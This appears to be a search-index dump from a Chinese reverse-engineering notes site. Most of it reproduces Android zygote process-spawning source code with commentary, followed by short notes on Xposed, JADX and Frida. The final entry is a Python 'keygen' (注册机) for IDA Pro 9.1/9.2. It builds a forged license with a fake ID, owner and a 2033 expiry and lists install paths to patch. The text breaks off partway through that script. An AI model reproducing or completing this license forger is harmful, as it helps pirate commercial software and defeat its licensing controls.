android.os.Process.zygoteSendArgsAndGetPid()\n         * Presently the wire format to the zygote process is:\n         * a) a count of arguments (argc, in essence)\n         * b) a number of newline-separated argument strings equal to count\n         *\n         * After the zygote process reads these it will write the pid of\n         * the child or -1 on failure.\n         */\n\n        int argc;\n\n        try {\n            String s = mSocketReader.readLine();\n\n            if (s == null) {\n                // EOF reached.\n                return null;\n            }\n            argc = Integer.parseInt(s);\n        } catch (NumberFormatException ex) {\n            Log.e(TAG, \"invalid Zygote wire format: non-int at argc\");\n            throw new IOException(\"invalid wire format\");\n        }\n\n        // See bug 1092107: large argc can be used for a DOS attack\n        if (argc &gt; MAX_ZYGOTE_ARGC) {\n            throw new IOException(\"max arg count exceeded\");\n        }\n\n        String[] result = new String[argc];\n        for (int i = 0; i &lt; argc; i++) {\n            result[i] = mSocketReader.readLine();\n            if (result[i] == null) {\n                // We got an unexpected EOF.\n                throw new IOException(\"truncated request\");\n            }\n        }\n\n        return result;\n    }\n\n    /**\n     * uid 1000 (Process.SYSTEM_UID) may specify any uid &amp;gt; 1000 in normal\n     * operation. It may also specify any gid and setgroups() list it chooses.\n     * In factory test mode, it may specify any UID.\n     *\n     * @param args non-null; zygote spawner arguments\n     * @param peer non-null; peer credentials\n     * @throws ZygoteSecurityException\n     */\n    private static void applyUidSecurityPolicy(Arguments args, Credentials peer)\n            throws ZygoteSecurityException {\n\n        if (peer.getUid() == Process.SYSTEM_UID) {\n            /* In normal operation, SYSTEM_UID can only specify a restricted\n             * set of UIDs. In factory test mode, SYSTEM_UID may specify any uid.\n             */\n            boolean uidRestricted = FactoryTest.getMode() == FactoryTest.FACTORY_TEST_OFF;\n\n            if (uidRestricted &amp;&amp; args.uidSpecified &amp;&amp; (args.uid &lt; Process.SYSTEM_UID)) {\n                throw new ZygoteSecurityException(\n                        \"System UID may not launch process with UID &lt; \"\n                        + Process.SYSTEM_UID);\n            }\n        }\n\n        // If not otherwise specified, uid and gid are inherited from peer\n        if (!args.uidSpecified) {\n            args.uid = peer.getUid();\n            args.uidSpecified = true;\n        }\n        if (!args.gidSpecified) {\n            args.gid = peer.getGid();\n            args.gidSpecified = true;\n        }\n    }\n\n    /**\n     * Applies debugger system properties to the zygote arguments.\n     *\n     * If \"ro.debuggable\" is \"1\", all apps are debuggable. Otherwise,\n     * the debugger state is specified via the \"--enable-jdwp\" flag\n     * in the spawn request.\n     *\n     * @param args non-null; zygote spawner args\n     */\n    public static void applyDebuggerSystemProperty(Arguments args) {\n        if (RoSystemProperties.DEBUGGABLE) {\n            args.runtimeFlags |= Zygote.DEBUG_ENABLE_JDWP;\n        }\n    }\n\n    /**\n     * Applies zygote security policy.\n     * Based on the credentials of the process issuing a zygote command:\n     * &lt;ol&gt;\n     * &lt;li&gt; uid 0 (root) may specify --invoke-with to launch Zygote with a\n     * wrapper command.\n     * &lt;li&gt; Any other uid may not specify any invoke-with argument.\n     * &lt;/ul&gt;\n     *\n     * @param args non-null; zygote spawner arguments\n     * @param peer non-null; peer credentials\n     * @throws ZygoteSecurityException\n     */\n    private static void applyInvokeWithSecurityPolicy(Arguments args, Credentials peer)\n            throws ZygoteSecurityException {\n        int peerUid = peer.getUid();\n\n        if (args.invokeWith != null &amp;&amp; peerUid != 0 &amp;&amp;\n            (args.runtimeFlags &amp; Zygote.DEBUG_ENABLE_JDWP) == 0) {\n            throw new ZygoteSecurityException(\"Peer is permitted to specify an\"\n                    + \"explicit invoke-with wrapper command only for debuggable\"\n                    + \"applications.\");\n        }\n    }\n\n    /**\n     * Applies invoke-with system properties to the zygote arguments.\n     *\n     * @param args non-null; zygote args\n     */\n    public static void applyInvokeWithSystemProperty(Arguments args) {\n        if (args.invokeWith == null &amp;&amp; args.niceName != null) {\n            String property = \"wrap.\" + args.niceName;\n            args.invokeWith = SystemProperties.get(property);\n            if (args.invokeWith != null &amp;&amp; args.invokeWith.length() == 0) {\n                args.invokeWith = null;\n            }\n        }\n    }\n\n    /**\n     * Handles post-fork setup of child proc, closing sockets as appropriate,\n     * reopen stdio as appropriate, and ultimately throwing MethodAndArgsCaller\n     * if successful or returning if failed.\n     *\n     * @param parsedArgs non-null; zygote args\n     * @param descriptors null-ok; new file descriptors for stdio if available.\n     * @param pipeFd null-ok; pipe for communication back to Zygote.\n     * @param isZygote whether this new child process is itself a new Zygote.\n     */\n    private Runnable handleChildProc(Arguments parsedArgs, FileDescriptor[] descriptors,\n            FileDescriptor pipeFd, boolean isZygote) {\n        /**\n         * By the time we get here, the native code has closed the two actual Zygote\n         * socket connections, and substituted /dev/null in their place.  The LocalSocket\n         * objects still need to be closed properly.\n         */\n\n        closeSocket();\n        if (descriptors != null) {\n            try {\n                Os.dup2(descriptors[0], STDIN_FILENO);\n                Os.dup2(descriptors[1], STDOUT_FILENO);\n                Os.dup2(descriptors[2], STDERR_FILENO);\n\n                for (FileDescriptor fd: descriptors) {\n                    IoUtils.closeQuietly(fd);\n                }\n            } catch (ErrnoException ex) {\n                Log.e(TAG, \"Error reopening stdio\", ex);\n            }\n        }\n\n        if (parsedArgs.niceName != null) {\n            Process.setArgV0(parsedArgs.niceName);\n        }\n\n        // End of the postFork event.\n        Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);\n        if (parsedArgs.invokeWith != null) {\n            WrapperInit.execApplication(parsedArgs.invokeWith,\n                    parsedArgs.niceName, parsedArgs.targetSdkVersion,\n                    VMRuntime.getCurrentInstructionSet(),\n                    pipeFd, parsedArgs.remainingArgs);\n\n            // Should not get here.\n            throw new IllegalStateException(\"WrapperInit.execApplication unexpectedly returned\");\n        } else {\n            if (!isZygote) {\n                return ZygoteInit.zygoteInit(parsedArgs.targetSdkVersion, parsedArgs.remainingArgs,\n                        null /* classLoader */);\n            } else {\n                return ZygoteInit.childZygoteInit(parsedArgs.targetSdkVersion,\n                        parsedArgs.remainingArgs, null /* classLoader */);\n            }\n        }\n    }\n\n    /**\n     * Handles post-fork cleanup of parent proc\n     *\n     * @param pid != 0; pid of child if &amp;gt; 0 or indication of failed fork\n     * if &amp;lt; 0;\n     * @param descriptors null-ok; file descriptors for child's new stdio if\n     * specified.\n     * @param pipeFd null-ok; pipe for communication with child.\n     */\n    private void handleParentProc(int pid, FileDescriptor[] descriptors, FileDescriptor pipeFd) {\n        if (pid &gt; 0) {\n            setChildPgid(pid);\n        }\n\n        if (descriptors != null) {\n            for (FileDescriptor fd: descriptors) {\n                IoUtils.closeQuietly(fd);\n            }\n        }\n\n        boolean usingWrapper = false;\n        if (pipeFd != null &amp;&amp; pid &gt; 0) {\n            int innerPid = -1;\n            try {\n                // Do a busy loop here. We can't guarantee that a failure (and thus an exception\n                // bail) happens in a timely manner.\n                final int BYTES_REQUIRED = 4;  // Bytes in an int.\n\n                StructPollfd fds[] = new StructPollfd[] {\n                        new StructPollfd()\n                };\n\n                byte data[] = new byte[BYTES_REQUIRED];\n\n                int remainingSleepTime = WRAPPED_PID_TIMEOUT_MILLIS;\n                int dataIndex = 0;\n                long startTime = System.nanoTime();\n\n                while (dataIndex &lt; data.length &amp;&amp; remainingSleepTime &gt; 0) {\n                    fds[0].fd = pipeFd;\n                    fds[0].events = (short) POLLIN;\n                    fds[0].revents = 0;\n                    fds[0].userData = null;\n\n                    int res = android.system.Os.poll(fds, remainingSleepTime);\n                    long endTime = System.nanoTime();\n                    int elapsedTimeMs = (int)((endTime - startTime) / 1000000l);\n                    remainingSleepTime = WRAPPED_PID_TIMEOUT_MILLIS - elapsedTimeMs;\n\n                    if (res &gt; 0) {\n                        if ((fds[0].revents &amp; POLLIN) != 0) {\n                            // Only read one byte, so as not to block.\n                            int readBytes = android.system.Os.read(pipeFd, data, dataIndex, 1);\n                            if (readBytes &lt; 0) {\n                                throw new RuntimeException(\"Some error\");\n                            }\n                            dataIndex += readBytes;\n                        } else {\n                            // Error case. revents should contain one of the error bits.\n                            break;\n                        }\n                    } else if (res == 0) {\n                        Log.w(TAG, \"Timed out waiting for child.\");\n                    }\n                }\n\n                if (dataIndex == data.length) {\n                    DataInputStream is = new DataInputStream(new ByteArrayInputStream(data));\n                    innerPid = is.readInt();\n                }\n\n                if (innerPid == -1) {\n                    Log.w(TAG, \"Error reading pid from wrapped process, child may have died\");\n                }\n            } catch (Exception ex) {\n                Log.w(TAG, \"Error reading pid from wrapped process, child may have died\", ex);\n            }\n\n            // Ensure that the pid reported by the wrapped process is either the\n            // child process that we forked, or a descendant of it.\n            if (innerPid &gt; 0) {\n                int parentPid = innerPid;\n                while (parentPid &gt; 0 &amp;&amp; parentPid != pid) {\n                    parentPid = Process.getParentPid(parentPid);\n                }\n                if (parentPid &gt; 0) {\n                    Log.i(TAG, \"Wrapped process has pid \" + innerPid);\n                    pid = innerPid;\n                    usingWrapper = true;\n                } else {\n                    Log.w(TAG, \"Wrapped process reported a pid that is not a child of \"\n                            + \"the process that we forked: childPid=\" + pid\n                            + \" innerPid=\" + innerPid);\n                }\n            }\n        }\n\n        try {\n            mSocketOutStream.writeInt(pid);\n            mSocketOutStream.writeBoolean(usingWrapper);\n        } catch (IOException ex) {\n            throw new IllegalStateException(\"Error writing to command socket\", ex);\n        }\n    }\n\n    private void setChildPgid(int pid) {\n        // Try to move the new child into the peer's process group.\n        try {\n            Os.setpgid(pid, Os.getpgid(peer.getPid()));\n        } catch (ErrnoException ex) {\n            // This exception is expected in the case where\n            // the peer is not in our session\n            // TODO get rid of this log message in the case where\n            // getsid(0) != getsid(peer.getPid())\n            Log.i(TAG, \"Zygote: setpgid failed. This is \"\n                + \"normal if peer is not in our session\");\n        }\n    }\n}\n</code></pre> <p>\u6bd4\u5bf9\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u91cc\u548c SystemServer \u7684\u5b75\u5316\u5341\u5206\u76f8\u4f3c</p> ZygoteConnectionZygoteInit /frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java<pre><code>        pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids,\n                parsedArgs.runtimeFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo,\n                parsedArgs.niceName, fdsToClose, fdsToIgnore, parsedArgs.startChildZygote,\n                parsedArgs.instructionSet, parsedArgs.appDataDir);\n\n        try {\n            if (pid == 0) {\n                // in child\n                zygoteServer.setForkChild();\n\n                zygoteServer.closeServerSocket();\n                IoUtils.closeQuietly(serverPipeFd);\n                serverPipeFd = null;\n\n                return handleChildProc(parsedArgs, descriptors, childPipeFd,\n                        parsedArgs.startChildZygote);\n            } else {\n                // In the parent. A pid &lt; 0 indicates a failure and will be handled in\n                // handleParentProc.\n                IoUtils.closeQuietly(childPipeFd);\n                childPipeFd = null;\n                handleParentProc(pid, descriptors, serverPipeFd);\n                return null;\n            }\n</code></pre> /frameworks/base/core/java/com/android/internal/os/ZygoteInit.java<pre><code>            /* Request to fork the system server process */\n            pid = Zygote.forkSystemServer(\n                    parsedArgs.mUid, parsedArgs.mGid,\n                    parsedArgs.mGids,\n                    parsedArgs.mRuntimeFlags,\n                    null,\n                    parsedArgs.mPermittedCapabilities,\n                    parsedArgs.mEffectiveCapabilities);\n        } catch (IllegalArgumentException ex) {\n            throw new RuntimeException(ex);\n        }\n\n        /* For child process */\n        if (pid == 0) {\n            if (hasSecondZygote(abiList)) {\n                waitForSecondaryZygote(socketName);\n            }\n\n            zygoteServer.closeServerSocket();\n            return handleSystemServerProcess(parsedArgs);\n        }\n</code></pre> <p>\u800c\u5728\u8c03\u7528\u7684 forkAndSpecialize \u548c forkSystemServer \u66f4\u4e3a\u76f8\u4f3c</p> forkAndSpecializeforkSystemServer /frameworks/base/core/java/com/android/internal/os/Zygote.java<pre><code>    public static int forkAndSpecialize(int uid, int gid, int[] gids, int runtimeFlags,\n          int[][] rlimits, int mountExternal, String seInfo, String niceName, int[] fdsToClose,\n          int[] fdsToIgnore, boolean startChildZygote, String instructionSet, String appDataDir) {\n        VM_HOOKS.preFork();\n        // Resets nice priority for zygote process.\n        resetNicePriority();\n        int pid = nativeForkAndSpecialize(\n                  uid, gid, gids, runtimeFlags, rlimits, mountExternal, seInfo, niceName, fdsToClose,\n                  fdsToIgnore, startChildZygote, instructionSet, appDataDir);\n        // Enable tracing as soon as possible for the child process.\n        if (pid == 0) {\n            Trace.setTracingEnabled(true, runtimeFlags);\n\n            // Note that this event ends at the end of handleChildProc,\n            Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"PostFork\");\n        }\n        VM_HOOKS.postForkCommon();\n        return pid;\n    }\n\n    native private static int nativeForkAndSpecialize(int uid, int gid, int[] gids,int runtimeFlags,\n          int[][] rlimits, int mountExternal, String seInfo, String niceName, int[] fdsToClose,\n          int[] fdsToIgnore, boolean startChildZygote, String instructionSet, String appDataDir);\n</code></pre> /frameworks/base/core/java/com/android/internal/os/Zygote.java<pre><code>    public static int forkSystemServer(int uid, int gid, int[] gids, int runtimeFlags,\n            int[][] rlimits, long permittedCapabilities, long effectiveCapabilities) {\n        VM_HOOKS.preFork();\n        // Resets nice priority for zygote process.\n        resetNicePriority();\n        int pid = nativeForkSystemServer(\n                uid, gid, gids, runtimeFlags, rlimits, permittedCapabilities, effectiveCapabilities);\n        // Enable tracing as soon as we enter the system_server.\n        if (pid == 0) {\n            Trace.setTracingEnabled(true, runtimeFlags);\n        }\n        VM_HOOKS.postForkCommon();\n        return pid;\n    }\n\n    native private static int nativeForkSystemServer(int uid, int gid, int[] gids, int runtimeFlags,\n            int[][] rlimits, long permittedCapabilities, long effectiveCapabilities);\n</code></pre> <p>\u5728 Native \u5c42\u4e2d\u5219\u662f\u76f4\u63a5\u8c03\u7528\u4e86 ForkAndSpecializeCommon</p> /frameworks/base/core/jni/com_android_internal_os_Zygote.cpp<pre><code>static jint com_android_internal_os_Zygote_nativeForkSystemServer(\n        JNIEnv* env, jclass, uid_t uid, gid_t gid, jintArray gids,\n        jint runtime_flags, jobjectArray rlimits, jlong permittedCapabilities,\n        jlong effectiveCapabilities) {\n  pid_t pid = ForkAndSpecializeCommon(env, uid, gid, gids,\n                                      runtime_flags, rlimits,\n                                      permittedCapabilities, effectiveCapabilities,\n                                      MOUNT_EXTERNAL_DEFAULT, NULL, NULL, true, NULL,\n                                      NULL, false, NULL, NULL);\n  if (pid &gt; 0) {\n      // The zygote process checks whether the child process has died or not.\n      ALOGI(\"System server process %d has been created\", pid);\n      gSystemServerPid = pid;\n      // There is a slight window that the system server process has crashed\n      // but it went unnoticed because we haven't published its pid yet. So\n      // we recheck here just to make sure that all is well.\n      int status;\n      if (waitpid(pid, &amp;status, WNOHANG) == pid) {\n          ALOGE(\"System server process %d has died. Restarting Zygote!\", pid);\n          RuntimeAbort(env, __LINE__, \"System server process has died. Restarting Zygote!\");\n      }\n\n      // Assign system_server to the correct memory cgroup.\n      // Not all devices mount /dev/memcg so check for the file first\n      // to avoid unnecessarily printing errors and denials in the logs.\n      if (!access(\"/dev/memcg/system/tasks\", F_OK) &amp;&amp;\n                !WriteStringToFile(StringPrintf(\"%d\", pid), \"/dev/memcg/system/tasks\")) {\n        ALOGE(\"couldn't write %d to /dev/memcg/system/tasks\", pid);\n      }\n  }\n  return pid;\n}\n</code></pre> <p>\u81f3\u6b64\u6211\u4eec\u53ef\u4ee5\u5168\u5fc3\u6295\u5165\u5e38\u89c4\u8fdb\u7a0b\u7684\u5b75\u5316\u5206\u6790\uff0c\u800c SystemServer \u7684\u5dee\u5f02\u6211\u4eec\u653e\u5728\u540e\u7eed\u8ba8\u8bba\u3002</p> /frameworks/base/core/jni/com_android_internal_os_Zygote.cpp<pre><code>// Utility routine to fork zygote and specialize the child process.\nstatic pid_t ForkAndSpecializeCommon(JNIEnv* env, uid_t uid, gid_t gid, jintArray javaGids,\n                                     jint runtime_flags, jobjectArray javaRlimits,\n                                     jlong permittedCapabilities, jlong effectiveCapabilities,\n                                     jint mount_external,\n                                     jstring java_se_info, jstring java_se_name,\n                                     bool is_system_server, jintArray fdsToClose,\n                                     jintArray fdsToIgnore, bool is_child_zygote,\n                                     jstring instructionSet, jstring dataDir) {\n  SetSignalHandlers();\n\n  sigset_t sigchld;\n  sigemptyset(&amp;sigchld);\n  sigaddset(&amp;sigchld, SIGCHLD);\n\n  auto fail_fn = [env, java_se_name, is_system_server](const std::string&amp; msg)\n      __attribute__ ((noreturn)) {\n    const char* se_name_c_str = nullptr;\n    std::unique_ptr&lt;ScopedUtfChars&gt; se_name;\n    if (java_se_name != nullptr) {\n      se_name.reset(new ScopedUtfChars(env, java_se_name));\n      se_name_c_str = se_name-&gt;c_str();\n    }\n    if (se_name_c_str == nullptr &amp;&amp; is_system_server) {\n      se_name_c_str = \"system_server\";\n    }\n    const std::string&amp; error_msg = (se_name_c_str == nullptr)\n        ? msg\n        : StringPrintf(\"(%s) %s\", se_name_c_str, msg.c_str());\n    env-&gt;FatalError(error_msg.c_str());\n    __builtin_unreachable();\n  };\n\n  // Temporarily block SIGCHLD during forks. The SIGCHLD handler might\n  // log, which would result in the logging FDs we close being reopened.\n  // This would cause failures because the FDs are not whitelisted.\n  //\n  // Note that the zygote process is single threaded at this point.\n  if (sigprocmask(SIG_BLOCK, &amp;sigchld, nullptr) == -1) {\n    fail_fn(CREATE_ERROR(\"sigprocmask(SIG_SETMASK, { SIGCHLD }) failed: %s\", strerror(errno)));\n  }\n\n  // Close any logging related FDs before we start evaluating the list of\n  // file descriptors.\n  __android_log_close();\n\n  std::string error_msg;\n\n  // If this is the first fork for this zygote, create the open FD table.\n  // If it isn't, we just need to check whether the list of open files has\n  // changed (and it shouldn't in the normal case).\n  std::vector&lt;int&gt; fds_to_ignore;\n  if (!FillFileDescriptorVector(env, fdsToIgnore, &amp;fds_to_ignore, &amp;error_msg)) {\n    fail_fn(error_msg);\n  }\n  if (gOpenFdTable == NULL) {\n    gOpenFdTable = FileDescriptorTable::Create(fds_to_ignore, &amp;error_msg);\n    if (gOpenFdTable == NULL) {\n      fail_fn(error_msg);\n    }\n  } else if (!gOpenFdTable-&gt;Restat(fds_to_ignore, &amp;error_msg)) {\n    fail_fn(error_msg);\n  }\n\n  pid_t pid = fork();\n\n  if (pid == 0) {\n    PreApplicationInit();\n\n    // Clean up any descriptors which must be closed immediately\n    if (!DetachDescriptors(env, fdsToClose, &amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n\n    // Re-open all remaining open file descriptors so that they aren't shared\n    // with the zygote across a fork.\n    if (!gOpenFdTable-&gt;ReopenOrDetach(&amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n\n    if (sigprocmask(SIG_UNBLOCK, &amp;sigchld, nullptr) == -1) {\n      fail_fn(CREATE_ERROR(\"sigprocmask(SIG_SETMASK, { SIGCHLD }) failed: %s\", strerror(errno)));\n    }\n\n    // Keep capabilities across UID change, unless we're staying root.\n    if (uid != 0) {\n      if (!EnableKeepCapabilities(&amp;error_msg)) {\n        fail_fn(error_msg);\n      }\n    }\n\n    if (!SetInheritable(permittedCapabilities, &amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n    if (!DropCapabilitiesBoundingSet(&amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n\n    bool use_native_bridge = !is_system_server &amp;&amp; (instructionSet != NULL)\n        &amp;&amp; android::NativeBridgeAvailable();\n    if (use_native_bridge) {\n      ScopedUtfChars isa_string(env, instructionSet);\n      use_native_bridge = android::NeedsNativeBridge(isa_string.c_str());\n    }\n    if (use_native_bridge &amp;&amp; dataDir == NULL) {\n      // dataDir should never be null if we need to use a native bridge.\n      // In general, dataDir will never be null for normal applications. It can only happen in\n      // special cases (for isolated processes which are not associated with any app). These are\n      // launched by the framework and should not be emulated anyway.\n      use_native_bridge = false;\n      ALOGW(\"Native bridge will not be used because dataDir == NULL.\");\n    }\n\n    if (!MountEmulatedStorage(uid, mount_external, use_native_bridge, &amp;error_msg)) {\n      ALOGW(\"Failed to mount emulated storage: %s (%s)\", error_msg.c_str(), strerror(errno));\n      if (errno == ENOTCONN || errno == EROFS) {\n        // When device is actively encrypting, we get ENOTCONN here\n        // since FUSE was mounted before the framework restarted.\n        // When encrypted device is booting, we get EROFS since\n        // FUSE hasn't been created yet by init.\n        // In either case, continue without external storage.\n      } else {\n        fail_fn(error_msg);\n      }\n    }\n\n    // If this zygote isn't root, it won't be able to create a process group,\n    // since the directory is owned by root.\n    if (!is_system_server &amp;&amp; getuid() == 0) {\n        int rc = createProcessGroup(uid, getpid());\n        if (rc != 0) {\n            if (rc == -EROFS) {\n                ALOGW(\"createProcessGroup failed, kernel missing CONFIG_CGROUP_CPUACCT?\");\n            } else {\n                ALOGE(\"createProcessGroup(%d, %d) failed: %s\", uid, pid, strerror(-rc));\n            }\n        }\n    }\n\n    std::string error_msg;\n    if (!SetGids(env, javaGids, &amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n\n    if (!SetRLimits(env, javaRlimits, &amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n\n    if (use_native_bridge) {\n      ScopedUtfChars isa_string(env, instructionSet);\n      ScopedUtfChars data_dir(env, dataDir);\n      android::PreInitializeNativeBridge(data_dir.c_str(), isa_string.c_str());\n    }\n\n    int rc = setresgid(gid, gid, gid);\n    if (rc == -1) {\n      fail_fn(CREATE_ERROR(\"setresgid(%d) failed: %s\", gid, strerror(errno)));\n    }\n\n    // Must be called when the new process still has CAP_SYS_ADMIN, in this case, before changing\n    // uid from 0, which clears capabilities.  The other alternative is to call\n    // prctl(PR_SET_NO_NEW_PRIVS, 1) afterward, but that breaks SELinux domain transition (see\n    // b/71859146).  As the result, privileged syscalls used below still need to be accessible in\n    // app process.\n    SetUpSeccompFilter(uid);\n\n    rc = setresuid(uid, uid, uid);\n    if (rc == -1) {\n      fail_fn(CREATE_ERROR(\"setresuid(%d) failed: %s\", uid, strerror(errno)));\n    }\n\n    if (NeedsNoRandomizeWorkaround()) {\n        // Work around ARM kernel ASLR lossage (http://b/5817320).\n        int old_personality = personality(0xffffffff);\n        int new_personality = personality(old_personality | ADDR_NO_RANDOMIZE);\n        if (new_personality == -1) {\n            ALOGW(\"personality(%d) failed: %s\", new_personality, strerror(errno));\n        }\n    }\n\n    if (!SetCapabilities(permittedCapabilities, effectiveCapabilities, permittedCapabilities,\n                         &amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n\n    if (!SetSchedulerPolicy(&amp;error_msg)) {\n      fail_fn(error_msg);\n    }\n\n    const char* se_info_c_str = NULL;\n    ScopedUtfChars* se_info = NULL;\n    if (java_se_info != NULL) {\n        se_info = new ScopedUtfChars(env, java_se_info);\n        se_info_c_str = se_info-&gt;c_str();\n        if (se_info_c_str == NULL) {\n          fail_fn(\"se_info_c_str == NULL\");\n        }\n    }\n    const char* se_name_c_str = NULL;\n    ScopedUtfChars* se_name = NULL;\n    if (java_se_name != NULL) {\n        se_name = new ScopedUtfChars(env, java_se_name);\n        se_name_c_str = se_name-&gt;c_str();\n        if (se_name_c_str == NULL) {\n          fail_fn(\"se_name_c_str == NULL\");\n        }\n    }\n    rc = selinux_android_setcontext(uid, is_system_server, se_info_c_str, se_name_c_str);\n    if (rc == -1) {\n      fail_fn(CREATE_ERROR(\"selinux_android_setcontext(%d, %d, \\\"%s\\\", \\\"%s\\\") failed\", uid,\n            is_system_server, se_info_c_str, se_name_c_str));\n    }\n\n    // Make it easier to debug audit logs by setting the main thread's name to the\n    // nice name rather than \"app_process\".\n    if (se_name_c_str == NULL &amp;&amp; is_system_server) {\n      se_name_c_str = \"system_server\";\n    }\n    if (se_name_c_str != NULL) {\n      SetThreadName(se_name_c_str);\n    }\n\n    delete se_info;\n    delete se_name;\n\n    // Unset the SIGCHLD handler, but keep ignoring SIGHUP (rationale in SetSignalHandlers).\n    UnsetChldSignalHandler();\n\n    env-&gt;CallStaticVoidMethod(gZygoteClass, gCallPostForkChildHooks, runtime_flags,\n                              is_system_server, is_child_zygote, instructionSet);\n    if (env-&gt;ExceptionCheck()) {\n      fail_fn(\"Error calling post fork hooks.\");\n    }\n  } else if (pid &gt; 0) {\n    // the parent process\n\n    // We blocked SIGCHLD prior to a fork, we unblock it here.\n    if (sigprocmask(SIG_UNBLOCK, &amp;sigchld, nullptr) == -1) {\n      fail_fn(CREATE_ERROR(\"sigprocmask(SIG_SETMASK, { SIGCHLD }) failed: %s\", strerror(errno)));\n    }\n  }\n  return pid;\n}\n</code></pre>"},{"location":"study/android/theory/#system-server","title":"System Server","text":""},{"location":"study/android/theory/#xposed","title":"Xposed","text":"\u53c2\u8003\u8d44\u6599 <ul> <li>Lsposed \u6280\u672f\u539f\u7406\u63a2\u8ba8 &amp;&amp; \u57fa\u672c\u5b89\u88c5\u4f7f\u7528 </li> </ul>"},{"location":"study/reverse/tools/JADX/","title":"JADX","text":"<p>\u5b89\u5353java\u5c42\u53cd\u7f16\u8bd1\u795e\u5668\uff0c\u5bf9\u4e8e\u53cd\u6df7\u6dc6\u6548\u679c\u4e0d\u5982jeb\u3002</p> <p>\u4f46\u662f\u5f00\u6e90\u9879\u76ee\u7528\u7684\u5c31\u662f\u723d\u3002</p>"},{"location":"study/reverse/tools/JADX/#_1","title":"\u5b89\u88c5:","text":"<p>JADX</p>"},{"location":"study/reverse/tools/JADX/#_2","title":"\u63d2\u4ef6:","text":"<p>\u4ec0\u4e48\uff0cjadx\u4e5f\u6709\u63d2\u4ef6\uff1f</p> <ol> <li>jadx-ai-mcp</li> </ol>"},{"location":"study/reverse/tools/frida/","title":"\u90a6\u90a6\u90a6\u90a6 \u771f\u795e\u6765\u4e86 Frida","text":""},{"location":"study/reverse/tools/frida/#frida_1","title":"\u4ec0\u4e48\u662ffrida","text":"<p>frida \u662f\u4e00\u6b3e\u57fa\u4e8e python+javascript \u7684 hook \u6846\u67b6\uff0c\u53ef\u8fd0\u884c\u5728 android\u3001ios\u3001linux\u3001win\u7b49\u5404\u4e2a\u5e73\u53f0\uff0c\u4e3b\u8981\u4f7f\u7528\u7684\u52a8\u6001\u4e8c\u8fdb\u5236\u63d2\u6869\u6280\u672f\u3002</p> <p>\u9879\u76ee\u5730\u5740</p> <p>\u5b98\u7f51\u53ca\u4f7f\u7528\u6587\u6863</p>"},{"location":"study/reverse/tools/frida/#_1","title":"\u57fa\u7840\u914d\u7f6e","text":"<ol> <li>\u5b89\u88c5frida     Bash<pre><code>pip install frida-tools\n</code></pre></li> <li>\u5728\u76ee\u6807\u8bbe\u5907\u914d\u7f6e\u5bf9\u5e94\u7248\u672c\u7684frida-server\u5e76\u8fd0\u884c</li> <li>\u6d4b\u8bd5frida\u6b63\u5e38\u8fde\u63a5     Bash<pre><code>frida-ps\n</code></pre></li> </ol>"},{"location":"study/reverse/tools/frida/#_2","title":"\u57fa\u7840\u4f7f\u7528","text":"<ul> <li>frida\u4f7f\u7528python\u5c06javascript\u811a\u672c\u6ce8\u5165\u5230\u76ee\u6807\u8fdb\u7a0b\u4e2d\u8fd0\u884c\uff0c\u4ece\u800c\u5b9e\u73b0hook\u529f\u80fd</li> <li>javascript\u57fa\u7840\u8bed\u6cd5\u8f83\u4e3a\u7b80\u5355\uff0c\u4f46\u662f\u5728frida\u4e2d\u6709\u5927\u91cf\u81ea\u5b9a\u4e49\u63a5\u53e3\uff0c\u9700\u901a\u8fc7\u6587\u6863\u4e0e\u811a\u672c\u9605\u8bfb\u7406\u89e3\u5b66\u4e60</li> </ul>"},{"location":"study/reverse/tools/ida_pro/","title":"IDA Pro\u7684\u5b89\u88c5\u4f7f\u7528\u4ee5\u53ca\u4e00\u4e9b\u63d2\u4ef6","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e 2025-10-27</p>"},{"location":"study/reverse/tools/ida_pro/#_1","title":"\u5b89\u88c5","text":""},{"location":"study/reverse/tools/ida_pro/#_2","title":"\u76f8\u5173\u94fe\u63a5:","text":"<ul> <li>Hex-Rays \u5b98\u65b9\u7f51\u7ad9</li> <li>\u770b\u96ea\u4f6c9.2\u914d\u7f6e\u957f\u8d34</li> </ul>"},{"location":"study/reverse/tools/ida_pro/#_3","title":"\u6ce8\u518c\u673a:","text":"IDA Pro ida pro 9.1/9.2 Python<pre><code># -*- coding: utf-8 -*-\n\nimport json\nimport hashlib\nimport os\nimport platform\n\n# IDA Pro\u53ef\u80fd\u7684\u5b89\u88c5\u8def\u5f84\uff08\u6839\u636e\u4f60\u7684\u5b9e\u9645\u60c5\u51b5\u4fee\u6539\uff09\nIDA_PATHS = [\n    r\"D:\\Program Files\\IDA Pro 9.2\",\n    r\"D:\\Program Files\\IDA Pro 9.1\",\n    r\"D:\\Program Files\\IDA Professional 9.2\",\n    r\"C:\\Program Files\\IDA Pro\",\n    r\"D:\\IDA\",\n    # \u6dfb\u52a0\u5176\u4ed6\u53ef\u80fd\u7684\u8def\u5f84\n]\n\nlicense = {\n    \"header\": {\"version\": 1},\n    \"payload\": {\n        \"name\": \"IDAPRO9\",\n        \"email\": \"idapro9@example.com\",\n        \"licenses\": [\n            {\n                \"id\": \"48-2137-ACAB-99\",\n                \"edition_id\": \"ida-pro\",\n                \"description\": \"license\",\n                \"license_type\": \"named\",\n                \"product\": \"IDA\",\n                \"product_id\": \"IDAPRO\",\n                \"product_version\": \"9.1\",\n                \"seats\": 1,\n                \"start_date\": \"2024-08-10 00:00:00\",\n                \"end_date\": \"2033-12-31 23:59:59\",\n                \"issued_on\": \"2024-08-10 00:00:00\",\n                \"owner\": \"HexRays\",\n                \"add_ons\": [],\n                \"features\": [],\n            }\n        ],\n    },\n}\n\n\ndef add_every_addon(license):\n    \"\"\"\u6dfb\u52a0\u6240\u6709\u63d2\u4ef6\u5230\u8bb8\u53ef\u8bc1\"\"\"\n    platforms = [\n        \"W\",  # Windows\n        \"L\",  # Linux\n        